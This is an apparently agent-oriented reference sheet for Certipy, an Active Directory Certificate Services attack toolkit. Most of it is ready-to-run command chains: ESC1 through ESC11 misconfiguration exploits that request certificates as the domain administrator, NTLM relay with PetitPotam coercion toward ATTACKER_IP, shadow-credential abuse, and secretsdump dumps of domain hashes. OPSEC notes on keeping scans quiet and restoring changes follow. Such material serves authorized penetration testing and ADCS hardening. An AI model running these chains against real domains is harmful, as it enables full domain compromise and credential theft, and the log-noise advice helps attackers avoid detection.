---
name: certipy
description: "Auth/lab ref: Python-based AD Certificate Services testing tool."
license: MIT
compatibility: "Linux/macOS/Windows; Python 3.9+."
metadata:
  author: AeonDave
  version: "1.0"
---

# Certipy

Python ADCS attack toolkit — enumerate templates, exploit ESC misconfigs, shadow credentials, PKINIT auth.

## Installation

```bash
pipx install certipy-ad
# or
pip install certipy-ad
```

## Authentication Syntax

```bash
# Password
certipy COMMAND -u user@DOMAIN -p password -dc-ip DC_IP

# Hash (PTH)
certipy COMMAND -u user@DOMAIN -hashes :NTHASH -dc-ip DC_IP

# Kerberos ccache
certipy COMMAND -u user@DOMAIN -k -dc-ip DC_IP
```

---

## 1. Enumeration

### find — discover ADCS attack surface

```bash
# Full enumeration — save to JSON+txt
certipy find -u user@DOMAIN -p pass -dc-ip DC_IP -stdout

# Save results for offline review
certipy find -u user@DOMAIN -p pass -dc-ip DC_IP -output certipy_results

# Show only vulnerable templates
certipy find -u user@DOMAIN -p pass -dc-ip DC_IP -vulnerable -stdout

# Include enabled templates only
certipy find -u user@DOMAIN -p pass -dc-ip DC_IP -enabled -stdout
```

**Output fields to inspect:**
- `[!] Vulnerabilities` → ESC flags detected
- `Enrollment Rights` → who can enroll (domain users = broad attack surface)
- `Extended Key Usage` → if empty or "Any Purpose" = very dangerous
- `Enrollee Supplies Subject` → if True = ESC1 candidate
- `CA Name` → target for request

---

## 2. ESC Attack Chains

### ESC1 — Enrollee Supplies Subject Alternative Name

Template allows requester to set arbitrary SAN. Request cert as any user including DA.

```bash
# 1. Identify ESC1 template
certipy find -u user@DOMAIN -p pass -dc-ip DC -vulnerable -stdout | grep -A5 "ESC1"

# 2. Request cert for administrator via SAN
certipy req -u user@DOMAIN -p pass -ca CA-NAME -template TEMPLATE_NAME -upn administrator@DOMAIN -dc-ip DC

# 3. Authenticate with cert → get NT hash
certipy auth -pfx administrator.pfx -domain DOMAIN -username administrator -dc-ip DC

# 4. PTH with recovered hash
secretsdump.py -hashes :NTHASH DOMAIN/administrator@DC
```

**Full one-liner chain:**
```bash
certipy req -u user@DOMAIN -p pass -ca "CORP-CA" -template "UserTemplate" -upn administrator@DOMAIN -dc-ip DC && \
certipy auth -pfx administrator.pfx -dc-ip DC
```

---

### ESC2 — Any Purpose or No EKU

Template has Any Purpose EKU or no EKU at all — can be used like ESC1 (SubjectAltName allowed when requesting as agent).

```bash
# Same workflow as ESC1 — request with -upn
certipy req -u user@DOMAIN -p pass -ca CA-NAME -template TEMPLATE_NAME -upn administrator@DOMAIN -dc-ip DC
certipy auth -pfx administrator.pfx -dc-ip DC
```

---

### ESC3 — Certificate Request Agent

Two-step: request enrollment agent cert, then use it to enroll on behalf of another user.

```bash
# Step 1 — get enrollment agent cert
certipy req -u user@DOMAIN -p pass -ca CA-NAME -template "Enrollment Agent Template" -dc-ip DC

# Step 2 — enroll on behalf of administrator using agent cert
certipy req -u user@DOMAIN -p pass -ca CA-NAME -template "Target Template" \
  -on-behalf-of DOMAIN\\administrator -pfx agent.pfx -dc-ip DC

# Step 3 — auth
certipy auth -pfx administrator.pfx -dc-ip DC
```

---

### ESC4 — Vulnerable Template ACL (WriteProperty/WriteDacl)

Attacker can modify template properties to introduce ESC1 vulnerability.

```bash
# 1. Save original template config
certipy template -u user@DOMAIN -p pass -template TEMPLATE_NAME -save-old -dc-ip DC

# 2. Modify template to enable SAN (makes it ESC1)
certipy template -u user@DOMAIN -p pass -template TEMPLATE_NAME -configuration TEMPLATE_NAME.json -dc-ip DC

# 3. Now exploit as ESC1
certipy req -u user@DOMAIN -p pass -ca CA-NAME -template TEMPLATE_NAME -upn administrator@DOMAIN -dc-ip DC
certipy auth -pfx administrator.pfx -dc-ip DC

# 4. Restore template after exploit
certipy template -u user@DOMAIN -p pass -template TEMPLATE_NAME -configuration TEMPLATE_NAME.old.json -dc-ip DC
```

---

### ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 on CA

CA has flag set that allows SAN in ALL requests regardless of template settings.

```bash
# Any template becomes exploitable — just add -upn (+ -sid if the SID extension is on, see below)
certipy req -u user@DOMAIN -p pass -ca CA-NAME -template User -upn administrator@DOMAIN -sid S-1-5-21-...-500 -dc-ip DC
certipy auth -pfx administrator.pfx -dc-ip DC
```

---

### ESC7 — Vulnerable CA ACL (ManageCertificates / ManageCA)

Attacker has Manage CA or Manage Certificates on the CA itself.

```bash
# Option A — ManageCA: enable ESC6 on CA then exploit
certipy ca -u user@DOMAIN -p pass -ca CA-NAME -enable-userspecifiedsan -dc-ip DC   # if this flag/path is unsupported, use the COM API (see certificate-abuse.md ESC7)
# Now ESC6 workflow works

# Option B — ManageCertificates: issue pending/failed cert requests
# 1. Request cert (it will fail without ManageCA)
certipy req -u user@DOMAIN -p pass -ca CA-NAME -template SubCA -dc-ip DC
# 2. Issue the denied request (get request ID from step 1 output)
certipy ca -u user@DOMAIN -p pass -ca CA-NAME -issue-request REQUEST_ID -dc-ip DC
# 3. Retrieve issued cert
certipy req -u user@DOMAIN -p pass -ca CA-NAME -retrieve REQUEST_ID -dc-ip DC
certipy auth -pfx administrator.pfx -dc-ip DC
```

> ESC7 `-issue-request` returning `Insufficient permissions`: officer rights load only after a
> **CertSvc restart**, and the issuer needs `Certificate Service DCOM Access` too. A gMSA CA-admin can
> `sc.exe stop/start certsvc` even without local admin. Full flow + COM-API ESC6/ESC16: `certificate-abuse.md`.

**`certipy auth` → `Object SID mismatch between certificate and user`.** The cert lacks the requester
SID (or has yours) while the target has one. Fix: re-request embedding the target SID
(`certipy req ... -sid <victim-SID>`), or exploit ESC16 (CA-wide SID extension disabled) so no SID is
expected, or use `impacket-getTGT -cert-pem ... -key-pem ...` for raw PKINIT (skips the SID check).

> `certipy account update -upn` needs write on the target's `userPrincipalName`; a self-write ACE does
> not always cover it (`doesn't have permission to update these attributes`) — confirm with `bloodyAD get writable` first.

---

### ESC8 — NTLM Relay to AD CS HTTP Enrollment Endpoint

Relay NTLM auth of machine account or user to the ADCS HTTP Web Enrollment endpoint — get cert for that account.

```bash
# 1. Start certipy relay listener
certipy relay -ca CA_IP -template DomainController -dc-ip DC_IP

# 2. Coerce target machine to authenticate (Coercer, PetitPotam, PrinterBug)
coercer.py -t TARGET_DC -l ATTACKER_IP
# or
python3 PetitPotam.py ATTACKER_IP TARGET_DC

# 3. Certipy auto-retrieves cert and converts to pfx
# 4. Auth with cert → get NT hash of DC machine account
certipy auth -pfx dc.pfx -dc-ip DC_IP

# 5. DCSync using DC machine hash
secretsdump.py -hashes :DC_NTHASH DOMAIN/DC$@DC_IP
```

---

### ESC9 — No Security Extension (CT_FLAG_NO_SECURITY_EXTENSION)

Template does not embed security extension — certificate mapping can be abused if account UPN is controllable.

```bash
# Requires GenericWrite on a target account
# 1. Change target account UPN to administrator UPN
certipy account -u attacker@DOMAIN -p pass -user targetuser -upn administrator@DOMAIN -dc-ip DC

# 2. Request cert as targetuser (uses administrator UPN due to no security extension)
certipy req -u targetuser@DOMAIN -p targetpass -ca CA-NAME -template TEMPLATE_NAME -dc-ip DC

# 3. Restore original UPN
certipy account -u attacker@DOMAIN -p pass -user targetuser -upn targetuser@DOMAIN -dc-ip DC

# 4. Auth with cert — maps to administrator
certipy auth -pfx administrator.pfx -dc-ip DC
```

---

### ESC11 — NTLM Relay to ADCS RPC (ICertPassage)

Relay NTLM to ADCS RPC interface instead of HTTP — same goal as ESC8.

```bash
certipy relay -target rpc://CA_IP -ca CA-NAME -template DomainController
# Then coerce auth as in ESC8
```

---

## 3. Shadow Credentials

Abuse `msDS-KeyCredentialLink` — add a key credential to a user/computer, then auth via PKINIT without their password.

```bash
# 1. Add shadow credential to target account (requires GenericWrite/WriteProperty)
certipy shadow auto -u user@DOMAIN -p pass -account TARGETACCOUNT -dc-ip DC

# Output: saves .pfx and prints NT hash of target
# certipy auto handles: add key → auth → remove key (clean)

# Manual steps if needed
certipy shadow add -u user@DOMAIN -p pass -account TARGET -dc-ip DC
certipy auth -pfx TARGET.pfx -dc-ip DC
certipy shadow remove -u user@DOMAIN -p pass -account TARGET -device-id DEVICE_ID -dc-ip DC
```

**When useful:**
- GenericWrite on user → get their NT hash without knowing password
- GenericWrite on computer → get machine account hash → RBCD or DCSync chain

---

## 4. Certificate Authentication (PKINIT)

Authenticate to KDC using a certificate. Retrieves TGT + NT hash via PKINIT U2U.

```bash
# Auth and get NT hash
certipy auth -pfx user.pfx -domain DOMAIN -username user -dc-ip DC

# PTH with recovered hash
secretsdump.py DOMAIN/user@DC -hashes :NTHASH

# Kerberos ccache output for tool use
certipy auth -pfx user.pfx -dc-ip DC
export KRB5CCNAME=user.ccache
```

---

## 5. CA Management

```bash
# List CAs
certipy ca -u user@DOMAIN -p pass -dc-ip DC -list

# List enabled templates on CA
certipy ca -u user@DOMAIN -p pass -ca CA-NAME -list-templates -dc-ip DC

# Enable template (requires ManageCA)
certipy ca -u user@DOMAIN -p pass -ca CA-NAME -enable-template TEMPLATE_NAME -dc-ip DC

# Disable template
certipy ca -u user@DOMAIN -p pass -ca CA-NAME -disable-template TEMPLATE_NAME -dc-ip DC

# Enable SAN flag (ESC6)
certipy ca -u user@DOMAIN -p pass -ca CA-NAME -enable-userspecifiedsan -dc-ip DC
```

---

## 6. Cert Conversion

```bash
# PEM to PFX
certipy cert -pfx cert.pem key.pem -export -out output.pfx

# PFX to PEM
certipy cert -pfx cert.pfx -export -pem

# PFX with password
certipy cert -pfx cert.pfx -password pfxpass -export -pem
```

---

## 7. Common Full Attack Chains

### Fast ESC1 chain (most common)

```bash
# Recon
certipy find -u user@DOMAIN -p pass -dc-ip DC -vulnerable -stdout

# Request as DA
certipy req -u user@DOMAIN -p pass -ca "CORP-CA" -template "VulnTemplate" -upn administrator@DOMAIN -dc-ip DC

# Auth → hash
certipy auth -pfx administrator.pfx -dc-ip DC

# Dump domain
secretsdump.py DOMAIN/administrator@DC -hashes :ADMIN_HASH
```

### ESC8 relay chain (machine account → DA)

```bash
# Terminal 1 — relay
certipy relay -ca CA_IP -template DomainController -dc-ip DC

# Terminal 2 — coerce DC
python3 PetitPotam.py ATTACKER_IP DC_IP

# After relay: auth with DC cert
certipy auth -pfx dc.pfx -dc-ip DC
secretsdump.py -hashes :DC_HASH DOMAIN/DC$@DC_IP
```

### GenericWrite → shadow creds → DA

```bash
# BloodHound identifies GenericWrite on svc_account
certipy shadow auto -u user@DOMAIN -p pass -account svc_account -dc-ip DC
# If svc_account is admin, done
# If not: use NT hash to enumerate further
```

---

## OPSEC Notes

- `certipy find` generates LDAP queries to enumerate CAs/templates — visible in LDAP logs
- `certipy req` generates a certificate request event (4886) on the CA — logged
- `certipy auth` PKINIT auth generates Kerberos TGT events (4768) with cert info
- Shadow credentials: modifying `msDS-KeyCredentialLink` generates Event 5136 (object modified)
- ESC8 relay: NTLM relay events on CA HTTP endpoint — monitor IIS logs on CA
- Prefer `-vulnerable -stdout` over full scan to minimize noise
- Always restore template changes (ESC4) after exploitation

## Resources

| File | When to load |
|------|--------------|
| `references/adcs-internals-and-detection.md` | Template field anatomy, ESC5/ESC10/ESC13 details, PKINIT U2U internals, cross-domain attacks, Rubeus integration, detection signatures |
